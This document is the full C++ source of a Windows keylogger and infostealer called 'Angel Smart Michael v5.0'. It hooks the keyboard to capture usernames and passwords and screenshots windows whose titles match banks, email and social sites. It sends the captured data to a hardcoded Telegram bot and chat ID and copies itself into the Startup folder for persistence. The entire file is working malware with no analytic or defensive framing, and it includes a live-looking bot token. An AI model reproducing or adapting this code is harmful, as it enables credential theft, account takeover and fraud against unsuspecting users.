#define WIN32_LEAN_AND_MEAN
#define STRICT

#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>
#include <winhttp.h>
#include <commctrl.h>
#include <shellapi.h>
#include <mutex>
#include <thread>
#include <string>
#include <vector>
#include <algorithm>
#include <cctype>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <codecvt>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winhttp.lib")

using namespace Gdiplus;

// Config
const wchar_t* TELEGRAM_BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* TELEGRAM_CHAT_ID = L"7845441585";
const wchar_t* MUTEX_NAME = L"AngelSmartMichael_v5.0_Singleton";

// Global state
std::mutex g_mutex;
std::wstring g_username, g_password;
bool g_running = true;
ULONG_PTR g_gdiplusToken;
HHOOK g_hKeyboardHook = NULL;
std::wstring g_currentField;

// Debug logging
void DebugLog(const std::wstring& message) {
    std::wofstream logfile(L"angel_debug.log", std::ios::app);
    if (logfile.is_open()) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        logfile << L"[" << st.wHour << L":" << st.wMinute << L":" << st.wSecond << L"] ";
        logfile << message << std::endl;
        logfile.close();
    }
}

// Forward declarations
bool SendTelegram(const std::wstring& message);
bool TakeSmartScreenshot();
bool UploadToTelegram(const std::wstring& filepath);
void HeartbeatThread();
void LoginDetectorThread();
std::wstring GetActiveWindowTitle();
bool IsLoginPage(const std::wstring& title);
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
void InstallPersistence();
std::wstring UrlEncode(const std::wstring& value);
bool SendTelegramMultipart(const std::wstring& filepath);

// URL encoding helper
std::wstring UrlEncode(const std::wstring& value) {
    std::wostringstream escaped;
    escaped.fill(L'0');
    escaped << std::hex;
    
    for (wchar_t c : value) {
        if (iswalnum(c) || c == L'-' || c == L'_' || c == L'.' || c == L'~') {
            escaped << c;
        } else if (c == L' ') {
            escaped << L'+';
        } else {
            escaped << L'%' << std::setw(2) << int((unsigned char)c);
        }
    }
    return escaped.str();
}

// Low-level keyboard hook
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        
        if (pKb->vkCode == VK_TAB) {
            if (!g_currentField.empty()) {
                if (g_username.empty()) g_username = g_currentField;
                else g_password = g_currentField;
                g_currentField.clear();
            }
            return 1;
        }
        
        if (pKb->vkCode == VK_RETURN) {
            if (!g_username.empty() && !g_password.empty()) {
                std::wstring creds = L"👼 CREDENTIALS CAPTURED:\n";
                creds += L"User: " + g_username + L"\n";
                creds += L"Pass: " + g_password + L"\n";
                SendTelegram(creds);
                g_username.clear();
                g_password.clear();
                g_currentField.clear();
            }
            return 1;
        }
        
        // Capture typing (letters A-Z, a-z, numbers 0-9)
        if ((pKb->vkCode >= 0x30 && pKb->vkCode <= 0x39) ||  // Numbers 0-9
            (pKb->vkCode >= 0x41 && pKb->vkCode <= 0x5A)) {   // Letters A-Z
            
            BYTE keyState[256] = {0};
            wchar_t buffer[10] = {0};
            
            GetKeyboardState(keyState);
            
            // Handle shift state
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                keyState[VK_SHIFT] = 0x80;
            }
            
            if (GetAsyncKeyState(VK_CAPITAL) & 0x0001) {
                keyState[VK_CAPITAL] = 0x01;
            }
            
            int result = ToUnicode(pKb->vkCode, pKb->scanCode, keyState, buffer, 10, 0);
            if (result > 0) {
                g_currentField += buffer[0];
            }
        }
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// Get active window title
std::wstring GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"";
    
    wchar_t title[512];
    if (GetWindowTextW(hwnd, title, 512) > 0) {
        return std::wstring(title);
    }
    return L"";
}

// Smart screenshot
bool TakeSmartScreenshot() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return false;
    
    std::wstring title = GetActiveWindowTitle();
    if (!IsLoginPage(title)) return false;
    
    // Wait a moment for window to be ready
    Sleep(100);
    
    HDC hdcScreen = GetDC(hwnd);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    RECT rcWindow;
    GetWindowRect(hwnd, &rcWindow);
    
    int width = rcWindow.right - rcWindow.left;
    int height = rcWindow.bottom - rcWindow.top;
    
    // Ensure valid dimensions
    if (width <= 0 || height <= 0) {
        DeleteDC(hdcMem);
        ReleaseDC(hwnd, hdcScreen);
        return false;
    }
    
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmScreen);
    
    // Copy screen content
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    // GDI+ save as JPEG
    Bitmap* bmp = Bitmap::FromHBITMAP(hbmScreen, NULL);
    if (!bmp) {
        SelectObject(hdcMem, hbmOld);
        DeleteObject(hbmScreen);
        DeleteDC(hdcMem);
        ReleaseDC(hwnd, hdcScreen);
        return false;
    }
    
    CLSID jpegClsid;
    if (GetEncoderClsid(L"image/jpeg", &jpegClsid) == -1) {
        delete bmp;
        SelectObject(hdcMem, hbmOld);
        DeleteObject(hbmScreen);
        DeleteDC(hdcMem);
        ReleaseDC(hwnd, hdcScreen);
        return false;
    }
    
    wchar_t tempPath[MAX_PATH];
    wchar_t filename[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    
    // Create unique filename
    SYSTEMTIME st;
    GetLocalTime(&st);
    swprintf_s(filename, MAX_PATH, L"angel_screenshot_%04d%02d%02d_%02d%02d%02d.jpg",
               st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    wcscat_s(tempPath, MAX_PATH, filename);
    
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 85;
    encoderParams.Parameter[0].Value = &quality;
    
    Status status = bmp->Save(tempPath, &jpegClsid, &encoderParams);
    
    delete bmp;
    SelectObject(hdcMem, hbmOld);
    DeleteObject(hbmScreen);
    DeleteDC(hdcMem);
    ReleaseDC(hwnd, hdcScreen);
    
    if (status == Ok) {
        DebugLog(L"Screenshot saved: " + std::wstring(tempPath));
        return SendTelegramMultipart(tempPath);
    } else {
        DebugLog(L"Screenshot save failed with status: " + std::to_wstring(status));
        return false;
    }
}

// Login page detection
bool IsLoginPage(const std::wstring& title) {
    if (title.empty()) return false;
    
    std::wstring lowerTitle = title;
    std::transform(lowerTitle.begin(), lowerTitle.end(), lowerTitle.begin(), ::towlower);
    
    std::vector<std::wstring> targets = {
        L"gmail", L"facebook", L"instagram", L"outlook", L"office", L"live",
        L"login", L"signin", L"sign in", L"account", L"auth", L"password",
        L"bank", L"paypal", L"amazon", L"netflix", L"twitter", L"x.com",
        L"chase", L"wellsfargo", L"bankofamerica", L"citi", L"microsoft",
        L"yahoo", L"linkedin", L"github", L"dropbox", L"ebay", L"spotify"
    };
    
    for (const auto& target : targets) {
        if (lowerTitle.find(target) != std::wstring::npos) {
            return true;
        }
    }
    return false;
}

// Telegram API - Send message only
bool SendTelegram(const std::wstring& message) {
    std::wstring url = L"/bot";
    url += TELEGRAM_BOT_TOKEN;
    url += L"/sendMessage";
    
    std::wstring params = L"chat_id=";
    params += TELEGRAM_CHAT_ID;
    params += L"&text=";
    params += UrlEncode(message);
    
    HINTERNET hSession = WinHttpOpen(L"AngelBot/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        DebugLog(L"WinHttpOpen failed");
        return false;
    }
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org",
                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        DebugLog(L"WinHttpConnect failed");
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", url.c_str(),
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        DebugLog(L"WinHttpOpenRequest failed");
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    // Set content type
    std::wstring headers = L"Content-Type: application/x-www-form-urlencoded";
    WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
    
    BOOL bResults = WinHttpSendRequest(hRequest,
                                       WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                       (LPVOID)params.c_str(),
                                       params.length() * sizeof(wchar_t),
                                       params.length() * sizeof(wchar_t), 0);
    
    if (!bResults) {
        DWORD dwError = GetLastError();
        DebugLog(L"WinHttpSendRequest failed with error: " + std::to_wstring(dwError));
    } else {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
        if (bResults) {
            // Read response for debugging
            DWORD dwSize = 0;
            WinHttpQueryDataAvailable(hRequest, &dwSize);
            if (dwSize > 0) {
                std::vector<char> buffer(dwSize + 1);
                DWORD dwDownloaded = 0;
                WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded);
                buffer[dwSize] = 0;
                DebugLog(L"Telegram response: " + std::wstring(buffer.begin(), buffer.end()));
            }
        }
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return bResults != FALSE;
}

// Telegram API - Send photo with multipart form
bool SendTelegramMultipart(const std::wstring& filepath) {
    DebugLog(L"📸 Uploading JPEG to Telegram: " + filepath);
    
    // Read file
    std::ifstream file(filepath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        DebugLog(L"Failed to open file: " + filepath);
        return false;
    }
    
    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<char> fileBuffer(fileSize);
    if (!file.read(fileBuffer.data(), fileSize)) {
        DebugLog(L"Failed to read file: " + filepath);
        return false;
    }
    
    // Create boundary
    std::string boundary = "----WebKitFormBoundary" + std::to_string(GetTickCount());
    
    // Build multipart form data
    std::stringstream formData;
    
    // Add chat_id field
    formData << "--" << boundary << "\r\n";
    formData << "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    formData << "7845441585\r\n";
    
    // Add photo field
    formData << "--" << boundary << "\r\n";
    formData << "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n";
    formData << "Content-Type: image/jpeg\r\n\r\n";
    
    std::string formDataStr = formData.str();
    
    // Convert boundary to wide string for headers
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    std::wstring wBoundary = converter.from_bytes(boundary);
    
    // Calculate total size
    DWORD totalSize = formDataStr.size() + fileSize + 4; // +4 for final boundary
    
    // Build request
    HINTERNET hSession = WinHttpOpen(L"AngelBot/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        DebugLog(L"WinHttpOpen failed");
        return false;
    }
    
    std::wstring url = L"/bot";
    url += TELEGRAM_BOT_TOKEN;
    url += L"/sendPhoto";
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org",
                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        DebugLog(L"WinHttpConnect failed");
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", url.c_str(),
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        DebugLog(L"WinHttpOpenRequest failed");
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    // Set multipart headers
    std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + wBoundary;
    WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
    
    // Send request headers
    BOOL bResults = WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, totalSize, 0);
    if (!bResults) {
        DWORD dwError = GetLastError();
        DebugLog(L"WinHttpSendRequest failed with error: " + std::to_wstring(dwError));
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    // Send form data
    DWORD dwWritten = 0;
    bResults = WinHttpWriteData(hRequest, formDataStr.c_str(), formDataStr.size(), &dwWritten);
    
    // Send file data
    if (bResults) {
        bResults = WinHttpWriteData(hRequest, fileBuffer.data(), fileSize, &dwWritten);
    }
    
    // Send final boundary
    if (bResults) {
        std::string finalBoundary = "\r\n--" + boundary + "--\r\n";
        bResults = WinHttpWriteData(hRequest, finalBoundary.c_str(), finalBoundary.size(), &dwWritten);
    }
    
    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }
    
    // Read response
    if (bResults) {
        DWORD dwSize = 0;
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (dwSize > 0) {
            std::vector<char> buffer(dwSize + 1);
            DWORD dwDownloaded = 0;
            WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded);
            buffer[dwSize] = 0;
            DebugLog(L"Telegram photo upload response: " + std::wstring(buffer.begin(), buffer.end()));
            
            if (strstr(buffer.data(), "\"ok\":true") != nullptr) {
                DebugLog(L"✅ Upload successful!");
            } else {
                DebugLog(L"❌ Upload failed - API error");
                bResults = FALSE;
            }
        }
    } else {
        DWORD dwError = GetLastError();
        DebugLog(L"WinHttpReceiveResponse failed with error: " + std::to_wstring(dwError));
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return bResults != FALSE;
}

bool UploadToTelegram(const std::wstring& filepath) {
    return SendTelegramMultipart(filepath);
}

// Persistence
void InstallPersistence() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    
    wchar_t startupPath[MAX_PATH];
    GetEnvironmentVariableW(L"APPDATA", startupPath, MAX_PATH);
    wcscat_s(startupPath, MAX_PATH, L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ANGELS.exe");
    
    CopyFileW(path, startupPath, FALSE);
    DebugLog(L"Installed persistence to: " + std::wstring(startupPath));
}

// Threads
void HeartbeatThread() {
    while (g_running) {
        std::this_thread::sleep_for(std::chrono::minutes(30));
        SendTelegram(L"👼 Angel Smart Michael v5.0 - ACTIVE");
    }
}

void LoginDetectorThread() {
    while (g_running) {
        if (TakeSmartScreenshot()) {
            std::this_thread::sleep_for(std::chrono::seconds(10));
        } else {
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
    }
}

// GDI+ Helpers
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (!pImageCodecInfo) return -1;
    
    GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    
    free(pImageCodecInfo);
    return -1;
}

// Entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Clear old debug log
    DeleteFileW(L"angel_debug.log");
    DebugLog(L"=== Angel Smart Michael v5.0 Starting ===");
    
    // Single instance
    HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        DebugLog(L"Another instance already running - exiting");
        return 0;
    }
    
    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL);
    DebugLog(L"GDI+ initialized");
    
    // Test Telegram connection
    DebugLog(L"Testing Telegram connection...");
    if (SendTelegram(L"👼 Angel Smart Michael v5.0 - Initialized")) {
        DebugLog(L"Telegram test message sent successfully");
    } else {
        DebugLog(L"Failed to send Telegram test message");
    }
    
    // Install persistence
    InstallPersistence();
    
    // Install keyboard hook
    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                        GetModuleHandle(NULL), 0);
    if (g_hKeyboardHook) {
        DebugLog(L"Keyboard hook installed");
    } else {
        DebugLog(L"Failed to install keyboard hook");
    }
    
    // Start threads
    std::thread heartbeat(HeartbeatThread);
    std::thread detector(LoginDetectorThread);
    DebugLog(L"Threads started");
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    g_running = false;
    
    if (heartbeat.joinable()) heartbeat.join();
    if (detector.joinable()) detector.join();
    
    if (g_hKeyboardHook) {
        UnhookWindowsHookEx(g_hKeyboardHook);
        DebugLog(L"Keyboard hook removed");
    }
    
    GdiplusShutdown(g_gdiplusToken);
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
    
    DebugLog(L"=== Angel Smart Michael v5.0 Shutting Down ===");
    
    return 0;
}
